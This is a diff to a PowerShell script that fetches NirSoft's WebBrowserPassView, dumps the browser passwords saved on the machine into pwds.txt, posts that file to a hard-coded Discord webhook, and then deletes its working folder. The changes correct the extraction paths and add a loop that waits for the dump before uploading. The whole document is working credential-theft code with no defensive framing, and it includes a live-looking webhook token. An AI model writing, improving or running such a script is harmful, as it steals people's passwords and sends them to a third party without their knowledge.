@@ -1,7 +1,9 @@
 $URL = "https://discordapp.com/api/webhooks/1276442521689395220/CnXvgEAYbwkbYIOC1ZOkG_wmf-2my3mRSQv7Xip6WM3FCRfrjYOctTAe3FKtI8uEs9HS"
 $fileName = "pwds.txt"
 $filePath = "C:\temp\" + $fileName
-$wshell = New-Object -ComObject wscript.shell;
+$wshell = New-Object -ComObject wscript.shell
+$timeout = 60
+$waitTime = 0
 
 mkdir \temp | Out-Null
 cd \temp
@@ -38,10 +40,8 @@ Invoke-WebRequest -Uri "https://www.nirsoft.net/protected_downloads/passreccomma
     -OutFile "passreccommandline.zip"
 iwr -uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip | Out-Null
 Expand-Archive 7z.zip | Out-Null
-.\7z\7za.exe e wbpv.zip -pnirsoft123! -y | Out-Null
-.\passreccommandline\WebBrowserPassView.exe /stext pwds.txt
-
-Sleep 4
+.\7z\7za.exe e passreccommandline.zip -pnirsoft123! -y | Out-Null
+.\WebBrowserPassView.exe /stext pwds.txt
 
 $boundary = [System.Guid]::NewGuid().ToString()
 $headers = @{
@@ -52,11 +52,17 @@ $body = @"
 --$boundary
 Content-Disposition: form-data; name="file"; filename="$(Split-Path -Leaf $filePath)"
 Content-Type: application/octet-stream
-
 $(Get-Content -Raw $filePath)
 --$boundary--
 "@
 
+while ($waitTime -lt $timeout) {
+    if ((Test-Path $filePath) -and ((Get-Item $filePath).length -gt 0)) {
+        break
+    }
+    Start-Sleep -Seconds 1
+    $waitTime++
+}
 Invoke-RestMethod -Uri $URL -Method Post -Headers $headers -Body $body | Out-Null
 cd C:\
 rm -R \temp
